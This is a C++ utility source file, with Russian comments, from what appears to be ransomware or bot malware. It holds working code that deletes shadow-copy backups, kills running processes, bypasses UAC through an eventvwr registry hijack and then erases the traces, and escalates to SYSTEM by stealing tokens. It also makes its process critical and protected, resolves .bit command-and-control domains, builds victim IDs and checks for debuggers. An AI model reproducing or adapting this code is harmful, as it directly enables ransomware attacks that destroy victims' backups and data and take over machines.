#include "Utils.h"
#include "Api.h"


void Dbg::print(char *fmt, ...)
{
#if SHOW_DBG == 1
	 va_list args;
	 va_start(args, fmt);
	 DWORD dw;
	 char err[1024];
	 wvsprintf(err, fmt, args);
	 WriteConsole(GetStdHandle(STD_OUTPUT_HANDLE), err, lstrlen(err), &dw, 0);
	 va_end(args);
#endif
	 return;
}

void Dbg::writeToFile(char *fileName, void* data, DWORD length)
{
#if SHOW_DBG == 1
	 DWORD dw;
	 HANDLE hFile = CreateFileA(fileName, GENERIC_WRITE, 0, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
	 WriteFile(hFile, data, length, &dw, 0);
	 CloseHandle(hFile);
#endif
}

LPSTR Dbg::formatMsg(int err)
{
#if SHOW_DBG == 1
	 LPSTR msg = (LPSTR)Mem::Alloc(101);
	 FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM, NULL, err, MAKELANGID(LANG_ENGLISH, SUBLANG_ENGLISH_US), msg, 101, 0);
	 return msg;
#endif
}

int Dbg::_getchar()
{
#if SHOW_DBG == 1
	DWORD dw;
	char str[2];
	ReadConsole(GetStdHandle(STD_INPUT_HANDLE), str, 2, &dw, NULL);
	return str[0];
#endif
}

BYTE* Utils::getProcAddress(HMODULE hModule, char* function)
{
	PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hModule;
	PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((DWORD)hModule + dos->e_lfanew);
	PIMAGE_OPTIONAL_HEADER pOpt = &nt->OptionalHeader;
	PIMAGE_EXPORT_DIRECTORY pImportDesc = (PIMAGE_EXPORT_DIRECTORY)((DWORD)hModule + pOpt->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
	/* Получаем массив функций */
	LPCSTR *l_ppszName = (LPCSTR*)((DWORD)hModule + pImportDesc->AddressOfNames);
	for (unsigned int i = 0; i < pImportDesc->NumberOfNames; ++i)
	{
		/* Ищем функцию по имени и возвращаем её адрес. */
		LPDWORD curName = (LPDWORD)(((LPBYTE)hModule) + pImportDesc->AddressOfNames + i * sizeof(DWORD));
		if (curName && lstrcmp(function, (LPSTR)((LPBYTE)hModule + *curName)) == 0)
		{
			LPWORD pw = (LPWORD)(((LPBYTE)hModule) + pImportDesc->AddressOfNameOrdinals + i * sizeof(WORD));
			curName = (LPDWORD)(((LPBYTE)hModule) + pImportDesc->AddressOfFunctions + (*pw) * sizeof(DWORD));
			return ((LPBYTE)hModule + *curName);
		}
	}
	return NULL;
}

BOOL Utils::IsDebugger()
{
	BOOLEAN IsDebug;
	Funcs::pRtlAdjustPrivilege(20, FALSE, FALSE, &IsDebug);
	return IsDebug;
}

HMODULE Utils::getNtdll()
{
	/* По соглашению о вызове __cdecl возвращаемое значение лежит в eax:
	https://msdn.microsoft.com/en-us/library/984x0h58.aspx
	*/
#ifndef _WIN64
	__asm
	{
		mov eax, fs:[0x30] // peb
		mov eax, [eax + 0xC] // peb.Ldr
		mov eax, [eax + 0xC] // Ldr.InLoadOrderModuleList.Flink (first module = our executable image )
		mov eax, [eax] // ntdll.dll
		// Здесь структура приводится к _LDR_MODULE: http://hex.pp.ua/nt/LDR_MODULE.php
		mov eax, [eax+0x18] // _LDR_MODULE.BaseAddress
	}
#else
	LPSTR encKey = GetEncryptKey();
	HMODULE ntdll = GetModuleHandleA(encKey);
	Mem::Free(encKey);
	return ntdll;
#endif
}

HMODULE Utils::getKernel32()
{
#ifndef _WIN64
	__asm
	{
		mov eax, fs:[0x30]
		mov eax, [eax+0xC]
		mov eax, [eax+0xC]
		mov eax, [eax]
		mov eax, [eax]
		mov eax, [eax+0x18]
	}
#else
	return GetModuleHandleA("kernel32.dll");
#endif
}

HMODULE Utils::getModuleHandle0()
{
#ifndef _WIN64
	__asm
	{
		mov eax, fs:[0x30]
		mov eax, [eax+0xC]
		mov eax, [eax+0xC]
		mov eax, [eax+0x18]
	}
#else
	return GetModuleHandle(NULL);
#endif
}

char* Utils::GetDisks()
{
	/*
	GetLogicalDrives возвращает диски в битовой маске (00000000000000100010111100).
	26 битов отвечают за диски справа налево, таким образом 2 первых нуля = A, B (дискеты вымерли :) ),
	затем C = 1. dwDrives & 1 проверяет последний бит, dwDrives >>= 1 сдвигает его.
	*/
	int index = 0;
	char *disks = (char*)Mem::Alloc(26);
	Mem::Zero(disks, 26);
	char disk = 'A';
	DWORD dwDrives = GetLogicalDrives();
	for (; disk != 'Z'; ++disk)
	{
		if (dwDrives & 1)
			disks[index++] = disk;
		dwDrives >>= 1;
	}
	return disks;
}



bool Utils::CreateLink(LPSTR link, LPSTR link_path, LPSTR description)
{
	IShellLink* psl = NULL;
	if (SUCCEEDED(CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER | CLSCTX_NO_FAILURE_LOG | CLSCTX_NO_CODE_DOWNLOAD,
		IID_IShellLink, (LPVOID*)&psl)))
	{
		IPersistFile* ppf = NULL;
		psl->SetPath(link);
		psl->SetDescription(description);
		if (SUCCEEDED(psl->QueryInterface(IID_IPersistFile, (LPVOID*)&ppf)))
		{
			wchar_t *wsz = Mem::Utf8toUtf16(link_path);
			ppf->Save(wsz, TRUE);
			ppf->Release();
			Mem::Free(wsz);
			return true;
		}
		psl->Release();
	}
	return false;
}

void Utils::ChangeLinkPath(LPSTR LinkPath, LPSTR NewLink)
{
	IShellLink* psl = NULL;
	if (SUCCEEDED(CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER | CLSCTX_NO_FAILURE_LOG | CLSCTX_NO_CODE_DOWNLOAD,
		IID_IShellLink, (LPVOID*)&psl)))
	{
		IPersistFile* ppf = NULL;
		if (SUCCEEDED(psl->QueryInterface(IID_IPersistFile, (LPVOID*)&ppf)))
		{
			wchar_t* wpath = Mem::Utf8toUtf16(LinkPath);
			if (SUCCEEDED(ppf->Load(wpath, STGM_READ)))
				if (SUCCEEDED(psl->Resolve(0, 0)))
					psl->SetPath(NewLink);
			Mem::Free(wpath);
			ppf->Release();
		}
		psl->Release();
	}
}

bool Utils::DeleteVss()
{
#ifdef MAIN
	bool ret = false;

	if (IsX64())
	{
		 LPSTR szCommand = NULL;

		 OSVERSIONINFOW os;
		 Funcs::pRtlGetVersion(&os);

		 char lpFile[MAX_PATH];
		 GetSystemDirectory(lpFile, MAX_PATH);
		 lstrcat(lpFile, "\\");

		 if (os.dwMajorVersion >= 6) // >= Windows Vista
		 {
			 lstrcat(lpFile, Strs::wmic);
			 szCommand = Strs::wmic_cmd;
		 }
		 else // Win XP
		 {
			 lstrcat(lpFile, Strs::cmd);
			 szCommand = Strs::vssadmin_cmd;
		 }
		 
		 if ((int)ShellExecuteA(NULL, Strs::open, lpFile, szCommand, NULL, SW_HIDE) > 32)
		 {
			  ret = true;
		 }

	}
	else
	{
		 IVssBackupComponents* pBackup;
		 if (SUCCEEDED(CreateVssBackupComponentsInternal(&pBackup)))
		 {
			  if (SUCCEEDED(pBackup->InitializeForBackup(NULL)))
			  {
					if (SUCCEEDED(pBackup->SetContext(VSS_CTX_ALL)))
					{
						 IVssEnumObject* pSnapshot;
						 if (SUCCEEDED(pBackup->Query(GUID_NULL, VSS_OBJECT_NONE, VSS_OBJECT_SNAPSHOT, &pSnapshot)))
						 {
							  VSS_OBJECT_PROP VssProp;
							  while (!ret)
							  {
									VSS_ID VssId;
									LONG lNum;
									ULONG ulNum;
									if (!SUCCEEDED(pSnapshot->Next(1, &VssProp, &ulNum)))
										 ret = true;
									if (!SUCCEEDED(pBackup->DeleteSnapshots(VssProp.Obj.Snap.m_SnapshotId, VSS_OBJECT_SNAPSHOT, 1, &lNum, &VssId)))
										 ret = true;
							  }
							  pSnapshot->Release();
						 }
					}
			  }
			  pBackup->Release();
		 }
	}
	return ret;
#endif
}


void Utils::SetCritical()
{
	/*
	Здесь использую два способа из-за того, что функции первого нестабильны и могут иногда не работать.
	20 = SeDebugPrivilege, в winnt SE_DEBUG_NAME, по счёту 20, поэтому и номер привилегии 20.
	29 в NtSetInformationProcess это BreakOnTermination. Взято из структуры в ReactOS, в винде она PROCESS_INFORMATION_CLASS:
	typedef enum _PROCESSINFOCLASS
	{
	    ProcessBasicInformation = 0,
	    ProcessDebugPort = 7,
	    ProcessWow64Information = 26,
	    ProcessImageFileName = 27,
	    ProcessBreakOnTermination = 29
	} PROCESSINFOCLASS; 
	*/
	BOOLEAN LastVal;
	Funcs::pRtlAdjustPrivilege(20, TRUE, FALSE, &LastVal);
	ULONG BreakOnTermination;
	Funcs::pNtSetInformationProcess(GetCurrentProcess(), 29, &BreakOnTermination, sizeof(ULONG));

	BOOLEAN WasCrit;
	Funcs::pRtlSetProcessIsCritical(TRUE, &WasCrit, FALSE);
}

void Utils::RemoveCritical()
{
	BOOLEAN WasCrit;
	Funcs::pRtlSetProcessIsCritical(FALSE, &WasCrit, FALSE);
}

bool Utils::ProtectProcess()
{
	/*
	Данная возможность доступна начиная с Windows Vista, поэтому для начала проверяем: Vista или выше у нас или нет.
	https://msdn.microsoft.com/en-us/library/windows/desktop/ms724832(v=vs.85).aspx
	*/
	bool ret = false;
	OSVERSIONINFOW OsVersion;
	Funcs::pRtlGetVersion(&OsVersion);
	if (OsVersion.dwMajorVersion < 6)
		return ret;
	SECURITY_ATTRIBUTES sa;
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.bInheritHandle = FALSE;
	// Мы устанавливаем SDDL_PROTECTED, подробнее флаги описаны тут: https://msdn.microsoft.com/en-us/library/windows/desktop/aa379570(v=vs.85).aspx
	if (ConvertStringSecurityDescriptorToSecurityDescriptorA("D:P", SDDL_REVISION_1, &sa.lpSecurityDescriptor, NULL))
	{
		HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());
		if (SetKernelObjectSecurity(hProcess, DACL_SECURITY_INFORMATION, sa.lpSecurityDescriptor))
		{
		   ret = true;
		}
		CloseHandle(hProcess);
	}
	return ret;
}

LPSTR Utils::GetBitDomen(LPSTR domen)
{
#ifdef MAIN
	/*
	Днс-резолверы для .bit:
	https://bitname.ru/index.php
	https://servers.opennicproject.org
	*/
	LPSTR DirectIp = NULL;
	IN_ADDR ipaddr;
	PDNS_RECORD ppQueryResults;
	LPSTR dns_servers[] = { "96.47.228.108", "169.239.202.202", "185.121.177.177", "91.217.137.44", "80.233.248.109" };
	const int length = sizeof(dns_servers) / sizeof(LPSTR); // Кол-во серверов в dns_servers
	PIP4_ARRAY pSrvList = (PIP4_ARRAY)Mem::Alloc(sizeof(IP4_ARRAY));
	for (int i = 0; i < length; ++i)
	{
		pSrvList->AddrArray[0] = inet_addr(dns_servers[i]);
		pSrvList->AddrCount = 1;
		/* Резолвим домен через специальные dns, которые и позволяют получить его ip. */
		if (SUCCEEDED(DnsQuery_A(domen, DNS_TYPE_A, DNS_QUERY_USE_TCP_ONLY, pSrvList, &ppQueryResults, 0)))
		{
			ipaddr.s_addr = ppQueryResults->Data.A.IpAddress;
			/* Превращаем структуру адреса в строку с ip. */
			DirectIp = inet_ntoa(ipaddr);
			break;
		}
	}
	Mem::Free(pSrvList);
	return DirectIp;
#endif
}

ULONG Utils::getLastError()
{
	__asm
	{
		mov eax, fs:[0x18] // TEB
		mov eax, [eax+0x34] // TEB.LastErrorValue
	}
}

void Utils::CloseProcesses(char *self)
{
#ifdef MAIN
	char procPath[MAX_PATH];
	GetModuleFileName(Utils::getModuleHandle0(), procPath, MAX_PATH);
	char *ptr = procPath + lstrlen(procPath);
	while (*--ptr != '\\');
	++ptr;
	char *selfPath = &procPath[ptr - procPath];
	PROCESSENTRY32 pe;
	Mem::Zero(&pe, sizeof(PROCESSENTRY32));
	pe.dwSize = sizeof(PROCESSENTRY32);
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot != INVALID_HANDLE_VALUE)
	{
		 char winDirectory[MAX_PATH];
		 GetWindowsDirectory(winDirectory, MAX_PATH);
		 while (Process32Next(hSnapshot, &pe)) // проходимся по всем процессам
		 {
			  HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
			  if (hProcess == INVALID_HANDLE_VALUE)
					continue;
			  char filePath[MAX_PATH];
			  if (GetModuleFileNameExA(hProcess, 0, filePath, MAX_PATH)) // получаем путь к файлу процесса
			  {
					if (!StrStrIA(filePath, winDirectory) && // если в пути не встречается C:\Windows (системный процесс)
						 lstrcmpi(pe.szExeFile, Strs::chrome) != 0 && // не Google Chrome
						 lstrcmpi(pe.szExeFile, Strs::firefox) != 0 && // не Mozilla Firefox
						 lstrcmpi(pe.szExeFile, Strs::iexplore) != 0 && // не Internet Explorer
						 lstrcmpi(pe.szExeFile, Strs::opera) != 0 && // не Opera
						 lstrcmpi(pe.szExeFile, self) != 0 &&  // не текущий процесс
						 lstrcmpi(pe.szExeFile, selfPath) != 0
						 )
					{
						 TerminateProcess(hProcess, 0);
					}
			  }
			  CloseHandle(hProcess);
		 }
		 CloseHandle(hSnapshot);
	}
#endif
}

void Utils::UacBypass()
{
	if (IsAdmin())
		return;
	LPSTR cmdLine = GetCommandLine();
	if (StrStr(cmdLine, Strs::uac1))
		return;
	HKEY hKey;
	char RegPath[MAX_PATH];
	/*
		RegPath = Software\\Classes\\mscfile\\shell\\open\\command
		Сделал таким образом, чтобы хранить меньше строк, т.к. Strs::eventvwr1 нужно в дальнейшем для очистки инфы в реестре.
	*/
	wsprintf(RegPath, "%s%s", Strs::eventvwr1, Strs::eventvwr2);
	// Создаём ключ в реестре, куда запишем инфу
	if (RegCreateKeyExA(HKEY_CURRENT_USER, RegPath, 0, NULL, REG_OPTION_VOLATILE, KEY_SET_VALUE, NULL, &hKey, NULL) == ERROR_SUCCESS)
	{
		BYTE *value = (BYTE*)Mem::Alloc(MAX_PATH);
		Mem::Zero(value, MAX_PATH);
		// Получаем путь к файлу текущего процесса 
		GetModuleFileNameA(getModuleHandle0(), (LPSTR)value, MAX_PATH);
		lstrcat((LPSTR)value, " ");
		lstrcat((LPSTR)value, Strs::uac1);
		// ставим путь в значение, которое именуется в реестре "по умолчанию", для функции у него нет имени.
		LSTATUS res = RegSetValueExA(hKey, NULL, 0, REG_EXPAND_SZ, value, MAX_PATH);
		Mem::Free(value);
		RegCloseKey(hKey);
		if (res == ERROR_SUCCESS)
		{
			/*
				Запускаем процесс, суть в том, что этот процесс всего лишь посредник и исполняет команду из HKCU\Software\Classes\mscfile\shell\open\command или
				HKCR\mscfile\shell\open\command. По первому пути обычно ничего нет, поэтому он переходит ко второму, а мы запишем и откроется наш процесс
				с правами админа.
			*/
			ShellExecuteA(HWND_DESKTOP, Strs::open, Strs::eventvwr_path, 0, 0, SW_SHOWNORMAL);
			// Нужно заснуть на некоторое время, чтобы eventvwr выполнил свою работу.
			Sleep(1000);
			// Зачищаем следы в реестре.
			RegDeleteTreeA(HKEY_CURRENT_USER, Strs::eventvwr1);
			ExitProcess(0);
		}
	}
}

BOOL Utils::IsAdmin()
{
	HANDLE hToken;
	// Открываем токен текущего процесса с правами на получение инфы.
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
	{
		TOKEN_ELEVATION elevation;
		DWORD size = sizeof(TOKEN_ELEVATION);
		// получаем инфу о токене. Здесь elevated означает "права админа" грубо говоря.
		GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(TOKEN_ELEVATION), &size);
		CloseHandle(hToken);
		return elevation.TokenIsElevated;
	}
	return FALSE;
}

ULONG VolumeGuid(PULONG volume)
{
	return (*volume = 1352459 * (*volume) + 2529004207);
}

LPSTR Utils::GetVictimId()
{
	// Основано на GUID: https://ru.wikipedia.org/wiki/GUID
	DWORD volume = 0;
	if (GetVolumeInformationA(Strs::diskC, NULL, 0, &volume, 0, NULL, NULL, 0))
	{
		GUID guid;
		guid.Data1 = VolumeGuid(&volume);
		guid.Data2 = (USHORT)VolumeGuid(&volume);
		guid.Data3 = (USHORT)VolumeGuid(&volume);
		for (int i = 0; i < 8; ++i)
			guid.Data4[i] = (UCHAR)VolumeGuid(&volume);
		LPSTR botId = (LPSTR)Mem::Alloc(50);
		wsprintf(botId, Strs::guidfmt, guid.Data1, guid.Data3, *(PULONG)&guid.Data4[2]);
		return botId;
	}
	return NULL;
}

bool Utils::IsSniffer()
{
	/*bool sniffer_found = false;
	PROCESSENTRY32 pe;
	Mem::Zero(&pe, sizeof(PROCESSENTRY32));
	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	while (Process32Next(hSnap, &pe)) // проходимся по всем процессам
	{
		// Проверяются: WinDump, Fiddler4, WireShark, Capsa без учёта регистра имени.
		if (!lstrcmpi(pe.szExeFile, Strs::windump) ||
			!lstrcmpi(pe.szExeFile, Strs::wireshark) ||
			!lstrcmpi(pe.szExeFile, Strs::fiddler) ||
			!lstrcmpi(pe.szExeFile, Strs::capsa))
		{
			sniffer_found = true;
			break;
		}
	}
	CloseHandle(hSnap);
	return sniffer_found;*/
	return true;
}

/*
Получает хендл потока нового процесса, если это не вышло, то вернём NULL и перестанем эксплуатировать уязвимость.
(Это означает, что у юзера либо стоит пароль, либо какие-то другие причины того, что не сработала CreateProcessWithLogonW)
*/
HANDLE GetThreadHandle()
{
	PROCESS_INFORMATION pi;
	STARTUPINFOW si;
	Mem::Zero(&pi, sizeof(PROCESS_INFORMATION));
	Mem::Zero(&si, sizeof(STARTUPINFO));
	si.cb = sizeof(STARTUPINFO);
	HANDLE hCurThread = GetCurrentThread();
	si.hStdError = hCurThread;
	si.hStdOutput = hCurThread;
	si.hStdInput = hCurThread;
	wchar_t* wstr = Mem::Utf8toUtf16(Strs::trump);
	wchar_t *wcmd = Mem::Utf8toUtf16(Strs::cmd);
	if (CreateProcessWithLogonW(wstr, wstr, wstr, LOGON_NETCREDENTIALS_ONLY, NULL, wcmd, CREATE_SUSPENDED, NULL, NULL, &si, &pi))
	{
		Mem::Free(wcmd);
		Mem::Free(wstr);
		HANDLE hThread;
		BOOL res = DuplicateHandle(pi.hProcess, (HANDLE)0x4, GetCurrentProcess(), &hThread, 0, FALSE, DUPLICATE_SAME_ACCESS);
		TerminateProcess(pi.hProcess, 1);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		if (!res)
			return NULL;
		return hThread;
	}
	else
	{
		Mem::Free(wcmd);
		Mem::Free(wstr);
		return NULL;
	}
}

// Получает системный токен из потока.
HANDLE GetSystemToken(HANDLE hThread)
{
	SuspendThread(hThread);
	SECURITY_QUALITY_OF_SERVICE sqos;
	Mem::Zero(&sqos, sizeof(SECURITY_QUALITY_OF_SERVICE));
	sqos.Length = sizeof(SECURITY_QUALITY_OF_SERVICE);
	sqos.ImpersonationLevel = SecurityImpersonation;
	SetThreadToken(&hThread, NULL);
	if (Funcs::pNtImpersonateThread(hThread, hThread, &sqos))
	{
		ResumeThread(hThread);
		return NULL;
	}
	HANDLE hToken;
	if (!OpenThreadToken(hThread, TOKEN_DUPLICATE | TOKEN_IMPERSONATE, FALSE, &hToken))
	{
		ResumeThread(hThread);
		return NULL;
	}
	ResumeThread(hThread);
	return hThread;
}

// Пытается установить потоку токен
DWORD WINAPI SetTokenThread(LPVOID lpArg)
{
	ThreadArg* arg = (ThreadArg*)lpArg;
	while (true)
		if (!SetThreadToken(&arg->hThread, arg->hToken))
			break;
	return FALSE;
}

void Utils::LPE()
{
	if (IsAdmin())
		return;
	char CurProc[MAX_PATH];
	GetModuleFileNameA(getModuleHandle0(), CurProc, MAX_PATH);
	wchar_t *wCurProc = Mem::Utf8toUtf16(CurProc);
	for (int i = 0; i < 2; ++i)
	{
		HANDLE hThread = GetThreadHandle();
		if (!hThread)
			return;
		THREAD_BASIC_INFORMATION info;
		DWORD ret;
		Funcs::pNtQueryInformationThread(hThread, ThreadBasicInformation, &info, sizeof(info), &ret);
		// 1-й токен = бездействие системы, 2-й = процесс system, как я понял, возможно неправ, если что - уточни у товарищей.
		if (i == 1) // 2-й токен
		{
			HANDLE hToken = GetSystemToken(hThread);
			if (!hToken)
				return;
			ThreadArg* arg = (ThreadArg*)Mem::Alloc(sizeof(ThreadArg));
			arg->hThread = hThread;
			DuplicateToken(hToken, SecurityImpersonation, &arg->hToken);
			CreateThread(NULL, 0, SetTokenThread, arg, 0, NULL);
			wchar_t* wstr = Mem::Utf8toUtf16(Strs::trump);
			while (true)
			{
				PROCESS_INFORMATION pi;
				STARTUPINFOW si;
				Mem::Zero(&pi, sizeof(PROCESS_INFORMATION));
				Mem::Zero(&si, sizeof(STARTUPINFOW));
				si.cb = sizeof(STARTUPINFOW);
				if (CreateProcessWithLogonW(wstr, wstr, wstr, LOGON_NETCREDENTIALS_ONLY, NULL, wCurProc, CREATE_SUSPENDED, NULL, NULL, &si, &pi))
				{
					HANDLE hProcessToken;
					// Если мы не можем получить доступ к токену процесса, то это системный процесс
					if (!OpenProcessToken(pi.hProcess, MAXIMUM_ALLOWED, &hProcessToken))
					{
						ResumeThread(pi.hThread);
						break;
					}
					// Чекаем, возможно процесс уже имеет права админа.
					TOKEN_ELEVATION elevation;
					DWORD dwSize = 0;
					if (!GetTokenInformation(hProcessToken, TokenElevation, &elevation, sizeof(elevation), &dwSize))
					{
						ResumeThread(pi.hThread);
						break;
					}
					if (elevation.TokenIsElevated)
						break;
					TerminateProcess(pi.hProcess, 1);
					CloseHandle(pi.hProcess);
					CloseHandle(pi.hThread);
				}
			}
			Mem::Free(wstr);
			break;
		}
		else
			 CloseHandle(hThread);
	}
}


LPSTR Utils::GetCurTime()
{
	char* buffer = (char*)Mem::Alloc(50);
	SYSTEMTIME st, lt;
	GetSystemTime(&st); // эта функция получает utc время
	/*
		UTC = local time + bias => local time = UTC - bias
		bias = разница в минутах, то есть -180, т.к. мск время = utc + 3 часа. Выявил вызовом GetTimeZoneInformation с поясом utc+3.
	*/
	TIME_ZONE_INFORMATION tzi;
	Mem::Zero(&tzi, sizeof(TIME_ZONE_INFORMATION));
	tzi.Bias = -180; // 3 часа
	SystemTimeToTzSpecificLocalTime(&tzi, &st, &lt); // конвертируем в МСК
	wsprintf(buffer, Strs::date_fmt, lt.wYear, lt.wMonth, lt.wDay, lt.wHour, lt.wMinute, lt.wSecond); // sql-формат
	return buffer;
}


char* Utils::conv_url(char *str)
{
	char *res = (char*)Mem::Alloc(lstrlen(str) + 500);
	int index = 0;
	for (int i = 0; i < lstrlen(str); ++i)
	{
		switch (str[i])
		{
		// case '_': - добавлять символы в таком виде
		case '+':
		{
			char num[2];
			// конвертируем число в hex-строку и копируем в результат.
			wsprintf(num, "%x", str[i]);
			res[index++] = '%';
			res[index++] = num[0];
			res[index++] = num[1];
			break;
		}
		default:
			res[index++] = str[i];
		}
	}
	res[index] = 0;
	return res;
}


char* Crypt::base64_encode(const unsigned char *input, int length)
{
	int i = 0, j = 0, s = 0;
	unsigned char char_array_3[3], char_array_4[4];

	int b64len = (length + 2 - ((length + 2) % 3)) * 4 / 3;
	char *b64str = (char *)Mem::Alloc(b64len + 1);
	if (!b64str)
		return NULL;

	while (length--) {
		char_array_3[i++] = *(input++);
		if (i == 3) {
			char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
			char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
			char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
			char_array_4[3] = char_array_3[2] & 0x3f;

			for (i = 0; i < 4; i++)
				b64str[s++] = Strs::base64_chars[char_array_4[i]];

			i = 0;
		}
	}
	if (i) {
		for (j = i; j < 3; j++)
			char_array_3[j] = '\0';

		char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
		char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
		char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
		char_array_4[3] = char_array_3[2] & 0x3f;

		for (j = 0; j < i + 1; j++)
			b64str[s++] = Strs::base64_chars[char_array_4[j]];

		while (i++ < 3)
			b64str[s++] = '=';
	}
	b64str[b64len] = '\0';

	return b64str;
}


char* Crypt::base64_decode(const char *input, int length, int *outlen)
{
	int i = 0, j = 0, r = 0, idx = 0;
	byte char_array_4[4], char_array_3[3];
	char *output = (char *)Mem::Alloc(length * 3 / 4);
	Mem::Zero(output, length * 3 / 4);
	while (length-- && input[idx] != '=') {
		//skip invalid or padding based chars
		if (!(IsCharAlphaNumeric(input[idx]) || input[idx] == '+' || input[idx] == '/')) {
			++idx;
			continue;
		}
		char_array_4[i++] = input[idx++];
		if (i == 4) {
			for (i = 0; i < 4; ++i)
				char_array_4[i] = (byte)(StrChr(Strs::base64_chars, char_array_4[i]) - Strs::base64_chars);
			char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
			char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
			char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];
			for (i = 0; (i < 3); ++i)
				output[r++] = char_array_3[i];
			i = 0;
		}
	}
	if (i) {
		for (j = i; j <4; ++j)
			char_array_4[j] = 0;
		for (j = 0; j <4; ++j)
			char_array_4[j] = (byte)(StrChr(Strs::base64_chars, char_array_4[j]) - Strs::base64_chars);
		char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
		char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
		char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];
		for (j = 0; (j < i - 1); ++j)
			output[r++] = char_array_3[j];
	}
	*outlen = r;
	output[r] = '\0';
	return output;
}

bool Utils::IsX64()
{
	 char buf[MAX_PATH];
	 if (!GetSystemWow64DirectoryA(buf, 256))
		  if (getLastError() == ERROR_CALL_NOT_IMPLEMENTED)
				return false;
	 return true;
}

void* Utils::ReadInfo()
{
	char CurFile[MAX_PATH];
	GetModuleFileNameA(getModuleHandle0(), CurFile, MAX_PATH);
	HANDLE hFile = CreateFileA(CurFile, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	DWORD size = GetFileSize(hFile, NULL), read;
	LPVOID hModule = Mem::Alloc(size);
	ReadFile(hFile, hModule, size, &read, NULL);
	CloseHandle(hFile);
	PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hModule;
	PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((DWORD)hModule + pDos->e_lfanew);
	PIMAGE_FILE_HEADER pFile = &pNt->FileHeader;
	// проходимся по секциям текущего файла
	for (int i = 0; i < pFile->NumberOfSections; ++i)
	{
		PIMAGE_SECTION_HEADER pSect = &IMAGE_FIRST_SECTION(pNt)[i];
		char name[9];
		Mem::Copy(name, pSect->Name, 8);
		if (!StrStr(name, Strs::trump))
			continue;
		return (void*)((DWORD)hModule + pSect->PointerToRawData);
	}
	return NULL;
}
